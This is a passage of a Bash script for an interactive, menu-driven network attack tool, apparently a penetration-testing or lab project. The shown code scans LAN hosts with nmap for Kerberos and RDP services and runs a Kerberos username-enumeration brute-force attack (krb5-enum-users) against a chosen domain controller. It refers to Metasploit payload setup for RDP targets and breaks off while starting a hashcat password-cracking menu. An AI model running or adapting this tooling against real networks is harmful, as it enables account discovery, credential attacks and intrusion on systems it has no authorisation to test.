	echo -e "${Light_Purple}nmap${NC} ${Green}$(echo $KERBEROS_TARGET)${NC} ${Light_Purple}-Pn${NC} ${Light_Purple}-p${NC} ${Cyan}88${NC},${Cyan}389${NC},${Cyan}3268${NC} ${Light_Purple}--open${NC} ${Light_Purple}-sV${NC} ${Light_Purple}--reason${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#execute nmap scan and save the output
	nmap $(echo $KERBEROS_TARGET) -Pn -p 88,389,3268 --open -sV --reason -oA $KERP88_NMAP_FILENAME | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME 
	#validate if $KERP88_NMAP_FILENAME.gnmap file exists
	if [ -f "$KERP88_NMAP_FILENAME.nmap" ]; then
		KERP88_GNMAP_VALIDATE=$(cat $KERP88_NMAP_FILENAME.nmap | egrep -v '^#' | grep 88 | grep open )
		#validate if fthe file has any results
		if [ -z "$KERP88_GNMAP_VALIDATE" ]; then
			echo -e "\n${Light_Red}[!]${NC} No Nmap scan results for open ${Cyan}port 88${NC}. Please choose another target." | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
		else
			#convert $KERP88_NMAP_FILENAME.xml to $KERP88_NMAP_FILENAME.html
			xsltproc -o $KERP88_NMAP_FILENAME.html $KERP88_NMAP_FILENAME.xml
			#execute firefox in root. takes in 1 argument
			FIREFOX_RUN $KERBEROS_DIR_PATH/$KERP88_NMAP_FILENAME.html
			#display the path of saved files to the user
			echo -e "File Saved: $(echo $KERBEROS_DIR_PATH)/$(echo $KERBEROS_TARGET).nmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $KERBEROS_DIR_PATH)/$(echo $KERBEROS_TARGET).gnmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $KERBEROS_DIR_PATH)/$(echo $KERBEROS_TARGET).xml" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $KERBEROS_DIR_PATH)/$(echo $KERBEROS_TARGET).html" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
		fi
	else
		echo -e "${Light_Red}[!]${NC} $KERP88_NMAP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#list out the arp ip address for the user to select the target
function KERBF_SELECT_TARGET {
	#change directory to ARP_DIR_PATH
	cd $ARP_DIR_PATH
	#validate if $ARP_FILENAME file exists
	if [ -f "$ARP_FILENAME" ]; then
		echo -e "\n${White}[*] Host(s) Detected:${NC}"
		#output $ARP_FILENAME list of IP addresses to user
		while read arp_list
		do
			#output ip addresses that are not the same as the default gateway
			if [ "$(echo $arp_list | awk -F ' ' '{print $1}')" != "$DEFAULT_GATEWAY" ]; then
				echo -e "${Light_Purple}[*]${NC} ${Green}$(echo $arp_list | awk -F ' ' '{print $1}')${NC}"
			fi
		done < $ARP_FILENAME
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Kerberos Enumusers Bruteforce Attack Menu"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		#assign checker variable for while loop
		KERBF_TARGET_CHECKER=0
		while [ "$KERBF_TARGET_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Enter your target: "
			read KERBF_TARGET
			#validate if $KERBF_TARGET is empty
			if [ -z "$KERBF_TARGET" ]; then
				echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
			else
				#validate if $KERBF_TARGET exist in $ARP_FILENAME
				if [ ! -z "$(cat $ARP_FILENAME | awk '{print $1}' | grep -Fx $KERBF_TARGET)" ]; then
					#allows user to choose if he/she wants to use the previously saved data
					KERBF_HISTORY_PROMPT
					KERBF_TARGET_CHECKER=1
				elif [ "$KERBF_TARGET" == "R" ] || [ "$KERBF_TARGET" == "r" ] || [ "$KERBF_TARGET" == "return" ] || [ "$KERBF_TARGET" == "Return" ] || [ "$KERBF_TARGET" == "RETURN" ]; then
					#resets $KERBF_TARGET
					KERBF_TARGET=''
					#reset checker variables to 0 before returning to the main menu
					SINGLE_TARGET_CHECKER=0
					NETWORK_TARGET_CHECKER=0
					#presents to user the main menu to choose a single target or to scan for a local area network
					MAIN_MENU
					KERBF_TARGET_CHECKER=1
				elif [ "$KERBF_TARGET" == "B" ] || [ "$KERBF_TARGET" == "b" ] || [ "$KERBF_TARGET" == "back" ] || [ "$KERBF_TARGET" == "Back" ] || [ "$KERBF_TARGET" == "BACK" ]; then
					#resets $KERBF_TARGET
					KERBF_TARGET=''
					#presents kerberos Bruteforce Attack menu to the user
					KERBEROS_BF_MENU
					KERBF_TARGET_CHECKER=1
				elif [ "$KERBF_TARGET" == "Q" ] || [ "$KERBF_TARGET" == "q" ] || [ "$KERBF_TARGET" == "quit" ] || [ "$KERBF_TARGET" == "Quit" ] || [ "$KERBF_TARGET" == "QUIT" ]; then
					exit
					KERBF_TARGET_CHECKER=1
				else
					echo -e "${Light_Red}[!]${NC} Please choose the target only from the list. Enter '${Orange}R${NC}'eturn, '${Orange}B${NC}'ack or '${Orange}Q${NC}'uit.\n"
				fi
			fi	
		done
	else
		#validate if user selected single target scan
		if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
			#get user input for the LAN IP address to inspect
			LAN_IP_MENU
		fi
			echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#execute nmap script for kerberos enumusers bruteforce attack
function KERBEROS_ENUMUSERS_RUN {
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		#assign single scan target IP to $KER_ENUMUSER_TARGET
		KER_ENUMUSER_TARGET=$LAN_IP_TARGET
	fi
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		#assign network scan target IP to $KER_ENUMUSER_TARGET
		KER_ENUMUSER_TARGET=$KERBF_TARGET
	fi
	#assign variable for date + time
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign nmap output filename
	KERENUMBF_FILENAME=$KER_ENUMUSER_TARGET"-"$DATE_TIME"-kerenum"
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#validate if $KERNMAP_RECORD is not empty
	if [ ! -z "$KERNMAP_RECORD" ]; then
		#extract domain name from past saved nmap record
		DOMAIN_NAME=$(cat $KERBEROS_DIR_PATH/$KERNMAP_RECORD | grep -i domain | awk '{print $13}' | head -n 1 | sed 's/,//g')
	fi
	#get user to input filename for the list of login usernames
	KER_USER_FNAME
	echo -e "${Light_Purple}nmap -Pn -p${NC} ${Cyan}88${NC} ${Green}$(echo $KER_ENUMUSER_TARGET)${NC} ${Light_Purple}--script${NC} ${Cyan}krb5-enum-users${NC} ${Light_Purple}--script-args${NC} ${Cyan}krb5-enum-users.realm=${NC}${Green}$(echo $DOMAIN_NAME)${NC},${Cyan}userdb=${NC}${Green}$(echo $KERBEROS_DIR_PATH)/$(echo $KERBF_NAME_LIST)${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "\n${Light_Purple}[-]${NC} Executing Nmap Kerberos Enumusers Bruteforce Attack... "
	echo
	nmap -Pn -p 88 $(echo $KER_ENUMUSER_TARGET) --script krb5-enum-users --script-args krb5-enum-users.realm=$(echo $DOMAIN_NAME),userdb=$KERBEROS_DIR_PATH/$KERBF_NAME_LIST -oA $KERBEROS_DIR_PATH/$KERENUMBF_FILENAME
	cat $KERBEROS_DIR_PATH/$KERENUMBF_FILENAME.nmap >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#convert $NMAP_RECORD_FNAME.xml to $NMAP_RECORD_FNAME.html
	xsltproc -o $KERBEROS_DIR_PATH/$KERENUMBF_FILENAME.html $KERBEROS_DIR_PATH/$KERENUMBF_FILENAME.xml
	#execute firefox in root. takes in 1 argument
	FIREFOX_RUN $KERBEROS_DIR_PATH/$KERENUMBF_FILENAME.html
	echo -e "File Saved: $(echo $NMAP_DIR_PATH)/$(echo $KERENUMBF_FILENAME).nmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "File Saved: $(echo $NMAP_DIR_PATH)/$(echo $KERENUMBF_FILENAME).gnmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "File Saved: $(echo $NMAP_DIR_PATH)/$(echo $KERENUMBF_FILENAME).xml" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo -e "File Saved: $(echo $NMAP_DIR_PATH)/$(echo $KERENUMBF_FILENAME).html" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
}

#locate a filename and assign it's path to a variable $FNAME_PATH. Takes in total 1 argument $1
function SEARCH_FNAME {
	FILENAME=$1
	sudo updatedb
	FNAME_PATH=$(sudo locate $FILENAME | egrep -v '.cache' | egrep -w $FILENAME$ | head -n 1)
}

#locate a filename and assign it's path to variables $FNAME_PATH1 and $FNAME_PATH2 respectively. Takes in total 2 arguments $1, $2
function SEARCH_FNAMES {
	FILENAME1=$1
	FILENAME2=$2
	sudo updatedb
	FNAME_PATH1=$(sudo locate $FILENAME1 | egrep -w $FILENAME1$ | head -n 1)
	FNAME_PATH2=$(sudo locate $FILENAME2 | egrep -w $FILENAME2$ | head -n 1)
}

#get user to input filename for the list of login usernames
function KER_USER_FNAME {
	#assign list of username filename variable
	KERBF_NAME_LIST="kerenum_usernames.lst"
	#assign checker variable for while loop
		KERBF_FNAME_CHECKER=0
		while [ "$KERBF_FNAME_CHECKER" -eq 0 ]
		do
			#get user input filename for the list of login usernames
			echo -e "\n${Light_Purple}[*]${NC} Preparing for Kerberos Enumusers Bruteforce Attack"
			echo -e -n "${Yellow}[?]${NC} Please enter the ${Cyan}filename${NC} of the list of login usernames: "
			read KERBF_FNAME
			#validate if $KERBF_FNAME is empty
			if [ -z "$KERBF_FNAME" ]; then
				echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again."
			else
				#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
				SEARCH_FNAME $KERBF_FNAME
				#validate if $FNAME_PATH is not empty
				if [ ! -z "$FNAME_PATH" ]; then
					#assign checker variable for while loop
					CONFIRM_KERBF_FNAME_CHECKER=0
					while [ "$CONFIRM_KERBF_FNAME_CHECKER" -eq 0 ]
					do
						#get user confirmation for filename
						echo -e -n "${Yellow}[?]${NC} Confirm filename: ${Cyan}$FNAME_PATH${NC} (y/n)? "
						read CONFIRM_KERBF_FNAME
						case $CONFIRM_KERBF_FNAME in
							y | Y | Yes | YES | yes )
							#locate $FNAME_PATH filename and assign it's path to a variable. Takes in 1 argument $1
							SEARCH_FNAME $KERBF_FNAME
							#validate if $FNAME_PATH is not empty
							if [ ! -z "$FNAME_PATH" ]; then
								cat $FNAME_PATH > $KERBEROS_DIR_PATH/$KERBF_NAME_LIST
								CONFIRM_KERBF_FNAME_CHECKER=1
								KERBF_FNAME_CHECKER=1
							else
								echo -e "${Light_Red}[!]${NC} The file ${Cyan}$KERBF_FNAME${NC} ${Light_Red}does not exits${NC}. Please try again."
								#get user to input filename for the list of login usernames
								KER_USER_FNAME
								CONFIRM_KERBF_FNAME_CHECKER=1
								KERBF_FNAME_CHECKER=1
							fi
							shift
							;;
							n | N | No | NO | no )
							#get user to input filename for the list of login usernames
							KER_USER_FNAME
							CONFIRM_KERBF_FNAME_CHECKER=1
							KERBF_FNAME_CHECKER=1
							shift
							;;
							r | R | return | Return | RETURN )
							#present the scan/attack menu to the user
							ATTACK_MENU
							CONFIRM_KERBF_FNAME_CHECKER=1
							KERBF_FNAME_CHECKER=1
							shift
							;;
							* )
							echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}', '${Orange}n${NC}' or '${Orange}R${NC}' to ${Orange}R${NC}eturn to Attack Menu.\n"
							shift
							;;
						esac	
					done	
				else
					echo -e "${Light_Red}[!]${NC} The file ${Cyan}$KERBF_FNAME${NC} ${Light_Red}does not exits${NC}. Please try again."
					#get user to input filename for the list of login usernames
					KER_USER_FNAME
					KERBF_FNAME_CHECKER=1
				fi
			fi	
		done
}

#execute nmap scan for kerberos and save it to a file and allow user to select the target
function KERBEROS_BF_SUB {
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign arp ip list
	ARP_IP_LIST=$LAN_IP_TARGET"-"$DATE_TIME"-ip.lst"
	#assign nmap os detection filename 
	OS_WIN_FNAME=$LAN_IP_TARGET"-"$DATE_TIME".gnmap"
	OS_WINIP_FNAME=$LAN_IP_TARGET"-"$DATE_TIME".ip"
	#change directory to $ARP_DIR_PATH
	cd $ARP_DIR_PATH
	#validate if $ARP_FNAME file exists
	if [ -f "$ARP_FILENAME" ]; then
		#extract only IP addresses from $ARP_FILENAME and save into a file
		cat $ARP_FILENAME | egrep -v '^#' | awk '{print $1}' > $KERBEROS_DIR_PATH/$ARP_IP_LIST
		#executes nmap -p 88 --open
		sudo nmap -p 88 -open -iL $KERBEROS_DIR_PATH/$ARP_IP_LIST -oG $KERBEROS_DIR_PATH/$OS_WIN_FNAME > /dev/null
		OSWIN=$(cat $KERBEROS_DIR_PATH/$OS_WIN_FNAME | egrep -v '^#' | grep 88 | grep -i open | awk -F " " '{print $NF}' | head -n 1)
		cat $KERBEROS_DIR_PATH/$OS_WIN_FNAME | egrep -v '^#' | grep 88 | grep -i open | awk -F " " '{print $2}' > $KERBEROS_DIR_PATH/$OS_WINIP_FNAME
		#validates if $OSWIN is not empty
		if [ ! -z "$OSWIN" ]; then
			echo
			echo -e "${Light_Purple}-----------------------------------------${NC}"
			echo -e "${White}${Light_Cyan}KERBEROS ENUMUSERS${NC} ${White}BRUTEFORCE ATTACK MENU${NC}"
			echo -e "${Light_Purple}-----------------------------------------${NC}"
			echo -e "${White}[*]${NC} Host(s) Detected: ${Cyan}$OSWIN${NC}"
			#validate if $OS_WINIP_FNAME file exists and output the list of ip with windows os
			if [ -f "$KERBEROS_DIR_PATH/$OS_WINIP_FNAME" ]; then
				while read win_ip
				do
					echo -e "${Light_Purple}[*]${NC} ${Green}$(echo $win_ip)${NC}"
				done < $KERBEROS_DIR_PATH/$OS_WINIP_FNAME
				echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
				#assign checker variable for while loop
				KERBF_TARGET_CHECKER=0
				while [ "$KERBF_TARGET_CHECKER" -eq 0 ]
				do
					echo -e -n "${Yellow}[?]${NC} Enter your target: "
					read KERBF_TARGET
					#validate if $FNAME_PATH is empty
					if [ -z "$KERBF_TARGET" ]; then
						echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
					else
						if grep -Fxq $KERBF_TARGET $KERBEROS_DIR_PATH/$OS_WINIP_FNAME; then
							KERBEROS_TARGET=$KERBF_TARGET
							#allows user to view past kerberos record
							KERBF_HISTORY_PROMPT
							KERBF_TARGET_CHECKER=1
						elif [ "$KERBF_TARGET" == "R" ] || [ "$KERBF_TARGET" == "r" ]; then
							#presents to user the main menu to choose a single target or to scan for a local area network
							MAIN_MENU
							KERBF_TARGET_CHECKER=1
						else
							echo -e "${Light_Red}[!]${NC} Please choose the target from the list only. Enter '${Orange}R${NC}' to return to Main Menu.\n"
						fi
					fi
				done
			else
				echo -e "${Light_Red}[!]${NC} $OS_WINIP_FNAME file does not exist. Please run $0 again."
			fi
		else
			echo -e "\n${Light_Purple}[*]${NC} Kerberos Bruteforce Attack Target:"
			echo -e "${Light_Red}[!]${NC} No host(s) with Windows OS detected for ${Green}$SUBNET_WM${NC}."
		fi
	else
		echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#presents remote desktop protocol Attack menu to the user
function RDP_MENU {
	echo
	echo -e "${Light_Purple}-----------------------------------${NC}"
	echo -e "${White}${Light_Cyan}REMOTE DESKTOP PROTOCOL${NC} ATTACK MENU${NC}"
	echo -e "${Light_Purple}-----------------------------------${NC}"
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}elect Target"
	fi
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}can For Open Port 3389: ${Green}$(echo $LAN_IP_TARGET)${NC}"
	fi
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn to Main Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}-----------------------------------${NC}"
	#assign checker variable for while loop
	RDP_MENU_CHECKER=0
	while [ "$RDP_MENU_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}S${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read RDP_MENU_CHOICE
		case $RDP_MENU_CHOICE in
			s | S | select | Select | SELECT | scan | Scan | SCAN)
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				RDP_TARGET=$LAN_IP_TARGET
				#execute nmap on selected target for RDP
				RDP_NMAP_RUN
				SINGLE_TARGET_CHECKER=2
				#presents remote desktop protocol Attack menu to the user
				RDP_MENU
			fi
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]] || [[ "$SINGLE_TARGET_CHECKER" -eq 2 ]]; then
				#execute nmap scan for RDP and save it to a file and allow user to select the target
				RDP_SELECT_TARGET
				#presents remote desktop protocol Attack menu to the user
				RDP_MENU
			fi
			RDP_MENU_CHECKER=1
			shift
			;;
			r | R | return | Retun | RETURN)
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			RDP_MENU_CHECKER=1
			shift
			;;
			g | G | go | Go | GO) 
			#present the scan/attack menu to the user
			ATTACK_MENU
			RDP_RECORD_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT)
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift 
			;;
		esac
	done
}

#execute nmap scan for remote desktop attack and save it to a file and allow user to select the target
function RDP_SUB {
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign arp ip list
	ARP_IP_LIST=$LAN_IP_TARGET"-"$DATE_TIME"-ip.lst"
	#assign nmap os detection filename 
	RDP_FNAME=$LAN_IP_TARGET"-"$DATE_TIME".gnmap"
	RDPIP_FNAME=$LAN_IP_TARGET"-"$DATE_TIME".ip"
	#change directory to $ARP_DIR_PATH
	cd $ARP_DIR_PATH
	#validate if $ARP_FNAME file exists
	if [ -f "$ARP_FILENAME" ]; then
		#extract only IP addresses from $ARP_FILENAME and save into a file
		cat $ARP_FILENAME | egrep -v '^#' | awk '{print $1}' > $RDP_DIR_PATH/$ARP_IP_LIST
		#executes nmap -p 3389 --open
		sudo nmap -p 3389 -open -iL $RDP_DIR_PATH/$ARP_IP_LIST -oG $RDP_DIR_PATH/$RDP_FNAME > /dev/null
		RDP_OPEN=$(cat $RDP_DIR_PATH/$RDP_FNAME | egrep -v '^#' | grep 3389 | grep -i open | awk -F " " '{print $NF}' | head -n 1)
		cat $RDP_DIR_PATH/$RDP_FNAME | egrep -v '^#' | grep 3389 | grep -i open | awk -F " " '{print $2}' > $RDP_DIR_PATH/$RDPIP_FNAME
		#validates if $RDP_OPEN is not empty
		if [ ! -z "$RDP_OPEN" ]; then
			echo
			echo -e "${Light_Purple}-----------------------------------${NC}"
			echo -e "${White}${Light_Cyan}REMOTE DESKTOP PROTOCOL${NC} ${White}ATTACK MENU${NC}"
			echo -e "${Light_Purple}-----------------------------------${NC}"
			echo -e "${White}[*]${NC} Host(s) Detected: ${Cyan}$RDP_OPEN${NC}"
			#validate if $RDPIP_FNAME file exists and output the list of ip with port 3389 open
			if [ -f "$RDP_DIR_PATH/$RDPIP_FNAME" ]; then
				while read rdp_ip
				do
					echo -e "${Light_Purple}[*]${NC} ${Green}$(echo $rdp_ip)${NC}"
				done < $RDP_DIR_PATH/$RDPIP_FNAME
				echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
				#assign checker variable for while loop
				RDP_TARGET_CHECKER=0
				while [ "$RDP_TARGET_CHECKER" -eq 0 ]
				do
					echo -e -n "${Yellow}[?]${NC} Enter your target: "
					read RDP_TARGET
					#validate if $RDP_TARGET is empty
					if [ -z "$RDP_TARGET" ]; then
						echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
					else
						if grep -Fxq $RDP_TARGET $RDP_DIR_PATH/$RDPIP_FNAME; then
							#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
							RDP_FINAL
							RDP_TARGET_CHECKER=1
						elif [ "$RDP_TARGET" == "R" ] || [ "$RDP_TARGET" == "r" ]; then
							#presents to user the main menu to choose a single target or to scan for a local area network
							MAIN_MENU
							RDP_TARGET_CHECKER=1
						else
							echo -e "${Light_Red}[!]${NC} Please choose the target from the list only. Enter '${Orange}R${NC}' to return to Main Menu.\n"
						fi
					fi
				done
			else
				echo -e "${Light_Red}[!]${NC} $RDPIP_FNAME file does not exist. Please run $0 again."
			fi
		else
			echo -e "\n${Light_Purple}[*]${NC} Remote Desktop Protocol Attack Target:"
			echo -e "${Light_Red}[!]${NC} No host(s) with Windows OS detected for ${Green}$SUBNET_WM${NC}."
		fi
	else
		echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#execute nmap on selected target for RDP
function RDP_NMAP_RUN {
	#assign $RDP_TARGET mac address
	NMAP_TARGETIP_MAC=$(arp-scan $RDP_TARGET | egrep ^$(echo $RDP_TARGET) | awk '{print $2}')
	#assign variable for date + time
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign nmap output filename
	RDP_NMAP_FILENAME=$RDP_TARGET"-"$DATE_TIME
	echo -e "\n${Light_Purple}[-]${NC} Executing Nmap scanning for Remote Desktop Protocol. Please be patient..."
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo
	#access $RDP_DIR_PATH to store files generated by the script
	cd $RDP_DIR_PATH
	echo -e "${Light_Purple}nmap${NC} ${Green}$(echo $RDP_TARGET)${NC} ${Light_Purple}-Pn${NC} ${Light_Purple}-p${NC} ${Cyan}3389${NC} ${Light_Purple}--open${NC} ${Light_Purple}-sV${NC} ${Light_Purple}--reason${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#execute nmap scan and save the output
	nmap $(echo $RDP_TARGET) -Pn -p 3389 --open -sV --reason -oA $RDP_NMAP_FILENAME | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME 
	#validate if $RDP_NMAP_FILENAME.gnmap file exists
	if [ -f "$RDP_NMAP_FILENAME.nmap" ]; then
		RDP_GNMAP_VALIDATE=$(cat $RDP_NMAP_FILENAME.nmap | egrep -v '^#' | grep 3389 | grep open )
		#validate if the file has any results
		if [ -z "$RDP_GNMAP_VALIDATE" ]; then
			echo -e "\n${Light_Red}[!]${NC} No Nmap scan results for open ${Cyan}port 3389${NC}. Please choose another target." | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
		else
			#convert $RDP_NMAP_FILENAME.xml to $RDP_NMAP_FILENAME.html
			xsltproc -o $RDP_NMAP_FILENAME.html $RDP_NMAP_FILENAME.xml
			#execute firefox in root. takes in 1 argument
			FIREFOX_RUN $RDP_DIR_PATH/$RDP_NMAP_FILENAME.html
			#display the path of saved files to the user
			echo -e "File Saved: $(echo $RDP_DIR_PATH)/$(echo $RDP_TARGET).nmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $RDP_DIR_PATH)/$(echo $RDP_TARGET).gnmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $RDP_DIR_PATH)/$(echo $RDP_TARGET).xml" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $RDP_DIR_PATH)/$(echo $RDP_TARGET).html" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#get user to either to proceed with remote desktop protocol connection or to set up metasploit payload
			RDP_FINAL
		fi
	else
		echo -e "${Light_Red}[!]${NC} $RDP_NMAP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#list out the arp ip address for the user to select the target
function RDP_SELECT_TARGET {
	cd $ARP_DIR_PATH
	#validate if $ARP_FILENAME file exists
	if [ -f "$ARP_FILENAME" ]; then
		echo -e "\n${White}[*] Host(s) Detected:${NC}"
		#output $ARP_FILENAME list of IP addresses to user
		while read arp_list
		do
			#output ip addresses that are not the same as the default gateway
			if [ "$(echo $arp_list | awk -F ' ' '{print $1}')" != "$DEFAULT_GATEWAY" ]; then
				echo -e "${Light_Purple}[*]${NC} ${Green}$(echo $arp_list | awk -F ' ' '{print $1}')${NC}"
			fi
		done < $ARP_FILENAME
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Remote Desktop Protocol Attack Menu"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		RDP_TARGET_CHECKER=0
		while [ "$RDP_TARGET_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Enter your target: "
			read RDP_TARGET
			#validate if $RDP_TARGET is empty
			if [ -z "$RDP_TARGET" ]; then
				echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
			else
				#validate if $RDP_TARGET exist in $ARP_FILENAME
				if [ ! -z "$(cat $ARP_FILENAME | awk '{print $1}' | grep -Fx $RDP_TARGET)" ]; then
					#allows user to choose if he/she wants to use the previously saved data
					RDP_HISTORY_PROMPT
					RDP_TARGET_CHECKER=1
				elif [ "$RDP_TARGET" == "R" ] || [ "$RDP_TARGET" == "r" ] || [ "$RDP_TARGET" == "return" ] || [ "$RDP_TARGET" == "Return" ] || [ "$RDP_TARGET" == "RETURN" ]; then
					#resets $RDP_TARGET
					RDP_TARGET=''
					#reset checker variables to 0 before returning to the main menu
					SINGLE_TARGET_CHECKER=0
					NETWORK_TARGET_CHECKER=0
					#presents to user the main menu to choose a single target or to scan for a local area network
					MAIN_MENU
					RDP_TARGET_CHECKER=1
				elif [ "$RDP_TARGET" == "B" ] || [ "$RDP_TARGET" == "b" ] || [ "$RDP_TARGET" == "back" ] || [ "$RDP_TARGET" == "Back" ] || [ "$RDP_TARGET" == "BACK" ]; then
					#resets $RDP_TARGET
					RDP_TARGET=''
					#presents remote desktop protocol Attack menu to the user
					RDP_MENU
					RDP_TARGET_CHECKER=1
				elif [ "$RDP_TARGET" == "Q" ] || [ "$RDP_TARGET" == "q" ] || [ "$RDP_TARGET" == "quit" ] || [ "$RDP_TARGET" == "Quit" ] || [ "$RDP_TARGET" == "QUIT" ]; then
					exit
					RDP_TARGET_CHECKER=1
				else
					echo -e "${Light_Red}[!]${NC} Please choose the target only from the list. Enter '${Orange}R${NC}'eturn, '${Orange}B${NC}'ack or '${Orange}Q${NC}'uit.\n"
				fi
			fi	
		done
	else
		#validate if user selected single target scan
		if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
			#get user input for the LAN IP address to inspect
			LAN_IP_MENU
		fi
			echo -e "${Light_Red}[!]${NC} $ARP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}


#execute hashcat using user's provided information
function HASHCAT_SETUP {
	#resets $FNAME_WORDLIST
	FNAME_WORDLIST=''
	#assign hash filename variable
	HASHCAT_WORDLIST="hashcat_pw.lst"
	echo -e "\n${Light_Purple}------------${NC}"
	echo -e "${White}${Light_Cyan}HASHCAT${NC} ${White}MENU${NC}"
	echo -e "${Light_Purple}------------${NC}"
	echo -e "${Light_Purple}[*]${NC} A wordlist, for example, rockyou.txt is needed to process the hash. "
	#assign checker variable for while loop
	HASHCAT_WORDLIST_CHECKER=0
	while [ "$HASHCAT_WORDLIST_CHECKER" -eq 0 ]
	do
		echo -e "${Light_Purple}[${NC}${Orange}R${NC}${Light_Purple}]${NC} ${Yellow}R${NC}eturn back to previous options "
		#get user input filename for the wordlist
		echo -e -n "${Yellow}[?]${NC} Please enter the wordlist's ${Cyan}filename${NC}: "
		read FNAME_WORDLIST
		#validate if $FNAME_WORDLIST is empty
		if [ -z "$FNAME_WORDLIST" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please try again.\n"
		elif [ "$FNAME_WORDLIST" == "r" ] || [ "$FNAME_WORDLIST" == "R" ]; then
